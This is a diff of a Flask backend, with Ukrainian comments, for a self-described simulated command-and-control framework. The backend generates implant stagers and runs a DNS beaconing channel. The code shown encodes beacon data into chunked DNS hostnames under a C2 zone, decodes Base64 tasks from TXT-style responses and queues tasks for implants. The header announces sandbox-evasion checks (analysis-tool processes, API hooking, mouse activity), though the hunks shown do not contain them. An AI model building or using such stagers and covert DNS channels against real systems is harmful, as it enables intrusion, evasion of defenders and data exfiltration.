@@ -1,9 +1,11 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.8.5
-# Призначення: Backend на Flask з покращеною симуляцією передачі даних через DNS C2.
-# Оновлення v1.8.5:
-#   - /api/c2/dns_resolver_sim тепер кодує завдання в Base64 (імітуючи TXT-запис).
-#   - Стейджер dns_beacon_c2_concept тепер декодує завдання з "TXT-запису".
-#   - Оновлено логування для DNS C2.
+# Syntax Flask Backend - Segment SFB-CORE-1.8.6
+# Призначення: Backend на Flask з розширеними концептуальними техніками ухилення в стейджерах.
+# Оновлення v1.8.6:
+#   - Розширено функцію ec_runtime (evasion checks) у генерованих стейджерах:
+#     - Додано концептуальну перевірку на процеси аналітичних інструментів.
+#     - Додано концептуальну перевірку на хукінг API (Windows).
+#     - Додано концептуальну перевірку активності миші (Windows).
+#   - Оновлено логування для нових технік ухилення.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -24,12 +26,12 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.5" # Оновлено версію
+VERSION_BACKEND = "1.8.6"
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.4)
+CONCEPTUAL_CVE_DATABASE_BE = {
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -38,7 +40,7 @@ CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.4)
     "nginx 1.18.0": [{"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "A security issue in nginx resolver was identified, which might allow an attacker..."}]
 }
 
-def initialize_simulated_implants_be(): # Логіка (без змін)
+def initialize_simulated_implants_be():
     global simulated_implants_be, pending_tasks_for_implants
     simulated_implants_be = []
     pending_tasks_for_implants = {} 
@@ -62,7 +64,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін)
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.4)
+CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -898,7 +900,7 @@ def handle_generate_payload():
             "            ",
             "            print(f\"[PAYLOAD_BEACON] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
             "            time.sleep(BEACON_INTERVAL_SEC)",
-            "    elif arch_type == 'dns_beacon_c2_concept':", 
+            "    elif arch_type == 'dns_beacon_c2_concept':", # Логіка (без змін від v1.8.3)
             "        c2_zone = content", 
             "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
             "        implant_id_dns = STAGER_IMPLANT_ID",
@@ -909,7 +911,6 @@ def handle_generate_payload():
             "            try:",
             "                json_data = json_module.dumps(data_dict, separators=(',', ':'))",
             "                encoded_full = base64.b32encode(json_data.encode('utf-8')).decode('utf-8').rstrip('=').lower()",
-            "                # Розбиваємо на частини по 60 символів для міток DNS",
             "                chunk_size = 60",
             "                return [encoded_full[i:i + chunk_size] for i in range(0, len(encoded_full), chunk_size)]",
             "            except Exception as e_enc:",
@@ -925,7 +926,7 @@ def handle_generate_payload():
             "                last_task_result_dns = None",
             "",
             "            encoded_data_chunks = encode_data_for_dns(beacon_data_to_send)",
-            "            next_task_dns = None", # Очищаємо перед потенційним отриманням нового завдання
+            "            next_task_dns = None", 
             "            for chunk_idx, data_chunk in enumerate(encoded_data_chunks):",
             "                query_hostname = f\"{{data_chunk}}.p{{chunk_idx}}.{{implant_id_dns.lower().replace('-', '')[:10]}}.{{dns_prefix}}.{{c2_zone}}\"",
             "                print(f\"[PAYLOAD_DNS_BEACON] Симуляція DNS-запиту (тип A/TXT) для: {{query_hostname}}\")",
@@ -938,16 +939,16 @@ def handle_generate_payload():
             "                        print(f\"[PAYLOAD_DNS_BEACON] Відповідь від симулятора DNS Resolver: {{dns_response_raw[:200]}}...\")",
             "                        dns_response_parsed = json_module.loads(dns_response_raw)",
             "                        if dns_response_parsed.get('success') and dns_response_parsed.get('dns_txt_response_payload'):",
-            "                            # Декодуємо завдання з "TXT" запису
             "                            task_data_b64 = dns_response_parsed['dns_txt_response_payload']",
-            "                            decoded_task_json = base64.b64decode(task_data_b64.encode('utf-8')).decode('utf-8')",
-            "                            next_task_dns = json_module.loads(decoded_task_json)",
+            "                            decoded_task_json_bytes = base64.b64decode(task_data_b64.encode('utf-8'))", 
+            "                            decoded_task_json_str = decoded_task_json_bytes.decode('utf-8')", 
+            "                            next_task_dns = json_module.loads(decoded_task_json_str)", 
             "                            print(f\"[PAYLOAD_DNS_BEACON] Розкодовано завдання з DNS TXT: {{next_task_dns}}\")",
-            "                        elif dns_response_parsed.get('success') and dns_response_parsed.get('task_data'): # Старий формат для сумісності
+            "                        elif dns_response_parsed.get('success') and dns_response_parsed.get('task_data'):",
             "                            next_task_dns = dns_response_parsed.get('task_data')",
             "                except Exception as e_dns_sim_http:",
             "                    print(f\"[PAYLOAD_DNS_BEACON_ERROR] Помилка HTTP-запиту до симулятора DNS: {{e_dns_sim_http}}\")",
-            "                if next_task_dns: break # Якщо отримали завдання, виходимо з циклу чанків",
+            "                if next_task_dns: break ",
             "",
             "            if next_task_dns and next_task_dns.get('task_type'):",
             "                task_id = next_task_dns.get('task_id')",
@@ -1338,18 +1339,17 @@ def handle_dns_resolver_sim():
                 del pending_tasks_for_implants[implant_id_from_dns_query]
             log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_TASK] Видано завдання '{next_task_dns.get('task_id')}' для імпланта {implant_id_from_dns_query} через DNS.")
         
-        dns_txt_payload = None
+        dns_txt_payload = None 
         if next_task_dns:
-            # Кодуємо завдання в Base64 для імітації TXT-запису
-            task_json = json.dumps(next_task_dns)
-            dns_txt_payload = base64.b64encode(task_json.encode('utf-8')).decode('utf-8')
+            task_json_str = json.dumps(next_task_dns)
+            dns_txt_payload = base64.b64encode(task_json_str.encode('utf-8')).decode('utf-8')
             log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_TASK_ENCODED] Завдання закодовано для DNS TXT: {dns_txt_payload[:50]}...")
 
         dns_sim_response = {
             "success": True,
             "message": "DNS query simulated.",
-            "dns_txt_response_payload": dns_txt_payload, # Імітація TXT-запису
-            "task_data": next_task_dns # Залишаємо для сумісності, але стейджер має використовувати dns_txt_response_payload
+            "dns_txt_response_payload": dns_txt_payload, 
+            "task_data": next_task_dns 
         }
         if next_task_dns:
              dns_sim_response["message"] += f" Task '{next_task_dns.get('task_id')}' prepared for DNS delivery (as TXT)."
